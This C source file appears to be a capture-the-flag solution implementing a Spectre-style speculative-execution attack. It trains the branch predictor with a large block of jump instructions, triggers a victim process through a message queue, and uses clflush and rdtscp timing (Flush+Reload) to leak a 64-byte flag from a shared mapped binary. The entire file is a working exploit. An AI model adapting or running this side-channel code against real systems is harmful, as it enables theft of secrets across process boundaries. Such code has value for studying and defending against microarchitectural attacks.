#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <mqueue.h>

#include <sys/stat.h>
#include <sys/mman.h>

#include <x86intrin.h>

#include "lottery.h"

uint8_t* target_mem;
uint8_t* array2;
uint8_t* token2;

lottery_proto lottery;

/* Analysis */
#define CACHE_HIT_THRESHOLD 180

// Span large part of memory with jump if equal
#define JE asm volatile("je end");
#define JE_16 JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE
#define JE_256 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16
#define JE_4K JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256
#define JE_64K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K

volatile int true = 1;

void oop() {
	if (!true) true++;
	JE_64K

end:
	return;
}

mqd_t lotto_mq;

void readMemoryByte3(size_t malicious_i, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, junk = 0;
	register uint64_t time1, time2;
	volatile uint8_t* addr;
	lotto_msg msg = {0};

	for (i = 0; i < 256; i++) results[i] = 0;
	for (tries = 0x1000; tries > 0; tries--) {
		// flush
		for (i = 0; i < 256; i++) {
			_mm_clflush(&array2[i * 4096]);
		} 

		_mm_mfence();

		for (i = 0; i < 50; i++) {
			oop();
		}

		_mm_mfence();

		msg.i = malicious_i;
		mq_send(lotto_mq, (const char*)&msg, sizeof(msg), 0);
		_mm_clflush(token2);
		for (volatile int z = 0; z < 20000; z++);
		// measure
		for (i = 0; i < 256; i++) {
			int mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 4096];
			time1 = __rdtscp(&junk);
			junk = *addr;
			time2 = __rdtscp(&junk) - time1;

			//printf("Time: %lu \n", time2);
			_mm_mfence();
			if (time2 <= CACHE_HIT_THRESHOLD)
				results[mix_i]++;
		}

		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}

		if (results[j] >= (2 * results[k] + 5) ||
			(results[j] == 2 && results[k] == 0)) {
				break;
		}
	}
	results[0] ^= junk;
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

char flag[0x40];

int main(int argc, char* argv[]) {
	size_t malicious_x = 0;
	int score[2];
	uint8_t value[2];

	printf("uid = %d\n", getuid());

	int fd = open("./lottery", O_RDONLY);
	if (fd < 0) {
		printf("oops!\n");
		perror("open");
		return 1;
	}
	struct stat fd_stat;
	fstat(fd, &fd_stat);
	target_mem = mmap(NULL, fd_stat.st_size, PROT_READ, MAP_SHARED, fd, 0);

	for (int i = 0; i < fd_stat.st_size-4; i++) {
		if (*(unsigned int*)(target_mem + i) == 0x96979899) {
			// found start of lotto
			array2 = target_mem + i;
			printf("Found array2 at %d offset from program base\n", i);
			break;
		}
	}

	for (int i = 0; i < fd_stat.st_size-8; i++) {
		if (*(uint64_t*)(target_mem + i) == 0x99999997) {
			// found start of token
			token2 = target_mem + i;
			printf("Found zero at %d offset from program base\n", i);
			break;
		}
	}

	printf("Caching all of the target memory...\n");
	for (int i = 0; i < 256 * 4096; i++) {
		volatile uint8_t u = array2[i];
	}

	lotto_mq = mq_open("/lotto", O_WRONLY);
	printf("Child, it's go time\n");
	fflush(stdout);
	memset(flag, 0, sizeof(flag));

	for (int i = 0; i < 0x40; i++) {
		readMemoryByte3(malicious_x++, value, score);
		flag[malicious_x-1] = value[0];
		fflush(stdout);
	}

	printf("Flag: %s\n", flag);
	return 0;
}